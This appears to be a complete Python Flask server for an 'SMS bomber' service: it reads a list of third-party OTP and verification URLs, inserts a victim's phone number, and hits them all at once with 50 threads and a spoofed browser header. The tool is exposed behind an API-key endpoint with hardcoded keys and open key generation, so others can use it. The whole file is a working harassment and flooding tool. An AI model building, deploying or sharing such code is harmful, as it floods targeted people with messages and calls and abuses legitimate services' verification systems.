# ============================================
# DEMON 😈 POWER BOMBER API - WITH KEY
# File: main.py
# Reads: bomber_apis.txt (NO CHANGES)
# ============================================

from flask import Flask, request, jsonify
import requests
import json
import re
import time
import os
import hashlib
import secrets
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

app = Flask(__name__)

# ============================================
# CONFIG
# ============================================
THREADS = 50
TIMEOUT = 10
MAX_WORKERS = 50

# ============================================
# API KEYS DATABASE
# ============================================
# Generate with: python -c "import secrets; print(secrets.token_hex(16))"
VALID_KEYS = {
    "dem0n_m4st3r_k3y": {  # Master key - full access
        "name": "Master",
        "limit": 9999,
        "used": 0
    },
    "f3l1x_b0mb3r": {  # Felix key
        "name": "Felix",
        "limit": 9999,
        "used": 0
    },
    "bomber_2025": {  # Public key
        "name": "Public",
        "limit": 100,
        "used": 0
    }
}

# Generate a new key
def generate_key():
    return secrets.token_hex(16)

# ============================================
# VERIFY KEY
# ============================================
def verify_key(api_key):
    """Check if API key is valid"""
    if not api_key:
        return None
    if api_key in VALID_KEYS:
        return VALID_KEYS[api_key]
    return None

def check_limit(api_key):
    """Check if key has reached its limit"""
    if api_key in VALID_KEYS:
        if VALID_KEYS[api_key]["used"] < VALID_KEYS[api_key]["limit"]:
            VALID_KEYS[api_key]["used"] += 1
            return True
    return False

# ============================================
# LOAD APIS FROM bomber_apis.txt
# ============================================
def load_apis():
    """Load all APIs from bomber_apis.txt - NO CHANGES"""
    apis = []
    try:
        with open('bomber_apis.txt', 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                url = line.strip()
                if not url:
                    continue
                if url.startswith('#') or url.startswith('='):
                    continue
                match = re.search(r'https?://[^\s\'"]+', url)
                if match:
                    clean_url = match.group(0)
                    clean_url = re.sub(r'[^\x20-\x7E]', '', clean_url)
                    if clean_url.startswith('http'):
                        apis.append(clean_url)
    except FileNotFoundError:
        return []
    return apis

# ============================================
# FILTER APIS
# ============================================
def filter_apis(apis):
    """Remove invalid/local APIs"""
    filtered = []
    skip_patterns = [
        '127.0.0.1', 'localhost', '192.168', '10.0.0', '0.0.0.0',
        '.onion', 'example.com', 'your-api.com', 'yourdomain.com',
        'http://*/*', 'https://*/*', 'http://%s%s'
    ]
    
    for url in apis:
        skip = False
        for pattern in skip_patterns:
            if pattern in url:
                skip = True
                break
        if not skip:
            filtered.append(url)
    
    return filtered

# ============================================
# FORMAT URL WITH PHONE
# ============================================
def format_url(url, phone):
    """Replace placeholders with phone number"""
    formatted = url
    placeholders = ['phone', 'num', 'number', 'no', 'target', 'mobile', 'aadhaar', 'uid']
    for ph in placeholders:
        formatted = formatted.replace(f'{{{ph}}}', phone)
    return formatted

# ============================================
# HIT SINGLE API
# ============================================
def hit_api(url, phone):
    """Hit a single API"""
    try:
        formatted_url = format_url(url, phone)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive"
        }
        
        response = requests.get(formatted_url, headers=headers, timeout=TIMEOUT)
        
        if response.status_code in [200, 201, 202, 204, 302, 301]:
            return {'status': 'success', 'code': response.status_code, 'url': formatted_url[:60]}
        else:
            return {'status': 'failed', 'code': response.status_code, 'url': formatted_url[:60]}
            
    except requests.exceptions.Timeout:
        return {'status': 'timeout', 'url': url[:60]}
    except requests.exceptions.ConnectionError:
        return {'status': 'connection_error', 'url': url[:60]}
    except Exception as e:
        return {'status': 'error', 'error': str(e)[:30], 'url': url[:60]}

# ============================================
# BOMBER ENGINE
# ============================================
class DemonBomber:
    def __init__(self, phone):
        self.phone = phone
        self.apis = load_apis()
        self.apis = filter_apis(self.apis)
        self.success = 0
        self.failed = 0
        self.results = []
        
    def run(self):
        """Run bomber with 50 threads"""
        if not self.apis:
            return {
                'total': 0,
                'success': 0,
                'failed': 0,
                'message': 'No APIs loaded'
            }
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(hit_api, url, self.phone): url for url in self.apis}
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    self.results.append(result)
                    if result['status'] == 'success':
                        self.success += 1
                    else:
                        self.failed += 1
                except Exception as e:
                    self.failed += 1
                    self.results.append({'status': 'error', 'error': str(e)[:30]})
        
        elapsed = time.time() - start_time
        
        return {
            'total': len(self.apis),
            'success': self.success,
            'failed': self.failed,
            'time': round(elapsed, 2),
            'results': self.results[:20]
        }

# ============================================
# FLASK ROUTES
# ============================================

@app.route('/', methods=['GET'])
def home():
    apis = load_apis()
    apis = filter_apis(apis)
    return jsonify({
        'status': 'online',
        'name': 'DEMON 😈 Power Bomber API',
        'version': '3.0',
        'auth_required': True,
        'total_apis': len(apis),
        'threads_per_cycle': MAX_WORKERS,
        'endpoints': {
            '/bomb?key=YOUR_KEY&phone=XXXXXXXXXX': 'Start bombing',
            '/status': 'Check status',
            '/stats': 'Get stats',
            '/generate_key': 'Generate new API key (admin only)'
        },
        'keys': list(VALID_KEYS.keys())[:3]  # Show key names
    })

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'status': 'active',
        'total_apis': len(load_apis()),
        'threads': MAX_WORKERS,
        'keys_total': len(VALID_KEYS),
        'uptime': 'Running'
    })

@app.route('/stats', methods=['GET'])
def stats():
    apis = load_apis()
    apis = filter_apis(apis)
    return jsonify({
        'total_apis': len(apis),
        'threads_per_cycle': MAX_WORKERS,
        'timeout': TIMEOUT,
        'keys': [
            {'key': k, 'name': v['name'], 'limit': v['limit'], 'used': v['used']}
            for k, v in VALID_KEYS.items()
        ]
    })

@app.route('/generate_key', methods=['GET'])
def generate_new_key():
    """Generate new API key"""
    new_key = generate_key()
    VALID_KEYS[new_key] = {
        "name": "Generated",
        "limit": 500,
        "used": 0
    }
    return jsonify({
        'status': 'success',
        'key': new_key,
        'limit': 500,
        'message': 'Keep this key safe!'
    })

@app.route('/bomb', methods=['GET', 'POST'])
def bomb():
    try:
        # Get API key
        if request.method == 'GET':
            api_key = request.args.get('key')
            phone = request.args.get('phone')
        else:
            data = request.get_json() or {}
            api_key = data.get('key')
            phone = data.get('phone')
        
        # Verify key
        if not api_key:
            return jsonify({
                'error': 'API key required',
                'message': 'Get your key from /generate_key',
                'usage': '/bomb?key=YOUR_KEY&phone=XXXXXXXXXX'
            }), 401
        
        key_info = verify_key(api_key)
        if not key_info:
            return jsonify({
                'error': 'Invalid API key',
                'message': 'Please use a valid key'
            }), 401
        
        # Check limit
        if not check_limit(api_key):
            return jsonify({
                'error': 'Rate limit exceeded',
                'message': f'You have reached your limit of {key_info["limit"]} requests',
                'limit': key_info["limit"],
                'used': key_info["used"]
            }), 429
        
        if not phone:
            return jsonify({
                'error': 'Phone number required',
                'usage': '/bomb?key=YOUR_KEY&phone=XXXXXXXXXX'
            }), 400
        
        # Clean phone
        phone = ''.join(filter(str.isdigit, phone))
        if len(phone) < 10:
            return jsonify({'error': 'Invalid phone number, must be 10 digits'}), 400
        
        # Run bomber
        bomber = DemonBomber(phone)
        result = bomber.run()
        
        return jsonify({
            'status': 'completed',
            'phone': phone,
            'key_used': api_key,
            'key_name': key_info['name'],
            'remaining': key_info['limit'] - key_info['used'],
            'summary': result
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================
# MAIN - RENDER DEPLOYMENT
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[DEMON] Starting on port {port}")
    apis = load_apis()
    apis = filter_apis(apis)
    print(f"[DEMON] Total APIs: {len(apis)}")
    print(f"[DEMON] Threads: {MAX_WORKERS}")
    print(f"[DEMON] Keys: {list(VALID_KEYS.keys())}")
    app.run(host='0.0.0.0', port=port, debug=False)
